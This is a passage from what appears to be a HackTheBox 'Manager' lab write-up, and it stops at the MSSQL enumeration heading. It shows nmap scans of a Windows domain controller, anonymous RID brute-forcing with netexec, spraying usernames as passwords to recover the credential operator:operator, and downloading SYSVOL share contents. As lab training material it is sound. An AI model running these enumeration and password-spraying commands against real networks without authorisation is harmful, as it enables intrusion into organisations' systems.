![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fde8cd9d-8c69-4862-8961-381a29b7b13b)

## First we run nmap full port scan to know whhat ports are open in the target 
`nmap -p- --min-rate 1000 -oN full.nmap -v -Pn <IP>`

```shell
# Nmap 7.94SVN scan initiated Wed Feb 21 12:26:46 2024 as: nmap -p- --min-rate 1000 -oN full.nmap -v -Pn 10.129.22.154
Increasing send delay for 10.129.22.154 from 0 to 5 due to 11 out of 31 dropped probes since last increase.
Increasing send delay for 10.129.22.154 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.129.22.154 from 10 to 20 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.129.22.154 from 20 to 40 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.129.22.154
Host is up (0.15s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49705/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Feb 21 12:30:14 2024 -- 1 IP address (1 host up) scanned in 208.18 seconds
```
now we know what ports are open, let's run default nmap scripts to know what services are running on these ports.

## nmap service scan 

```shell
# Nmap 7.94SVN scan initiated Wed Feb 21 12:43:23 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,80,88,135,139,445,464,593,3268,3269,5985,9389 -Pn 10.129.22.154
Nmap scan report for manager.htb (10.129.22.154)
Host is up (0.16s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-21 18:46:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-21T18:48:22+00:00; +7h03m30s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-21T18:48:23+00:00; +7h03m30s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-21T18:47:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h03m29s, deviation: 0s, median: 7h03m29s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 21 12:44:53 2024 -- 1 IP address (1 host up) scanned in 90.40 seconds
```
now we know what services are open on the target 


## Enumerating SMB
```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ smbclient -L //manager.htb/ -N          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
checking for shares available anonymously on smb server, got nothing. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/819c307b-fca2-4107-9213-daba2b372fa7)

```shell
sudo nxc smb 10.129.22.154 -u anonymous -p '' --rid-brute
```

using nexec to bruteforce rid of users, we got some users in the domain. 

```
zhong 
cheng 
ryan 
raven 
jinWoo 
chinHae 
operator 
```
we made a userlist with the usernames. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5f9f241f-8cb6-4f2a-9cc7-a4b397d4dbe2)

```shell
sudo nxc smb 10.129.22.154 -u users.txt -p users.txt
```
bruteforcing smb using the users gotten with the same users as password to see if we got a weak cred. we can see we have smb access as user `operator:operator`.

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
└─$ sudo nxc smb 10.129.22.154 -u operator -p operator --shares 
SMB         10.129.22.154   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.22.154   445    DC01             [+] manager.htb\operator:operator 
SMB         10.129.22.154   445    DC01             [*] Enumerated shares
SMB         10.129.22.154   445    DC01             Share           Permissions     Remark
SMB         10.129.22.154   445    DC01             -----           -----------     ------
SMB         10.129.22.154   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.22.154   445    DC01             C$                              Default share
SMB         10.129.22.154   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.22.154   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.22.154   445    DC01             SYSVOL          READ            Logon server share
```
enumerating smb using the creds we got, we can see we have read access to shares `NETVOL` & `SYSVOL`. let's check em out.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8c5754b5-1b5f-4143-b5db-8dfd93e5c059)

checking the `NETLOGON` share was empty, we got a dir in the `SYSVOL` share. proceded to download everything in it. 


## Enumerating mssql 

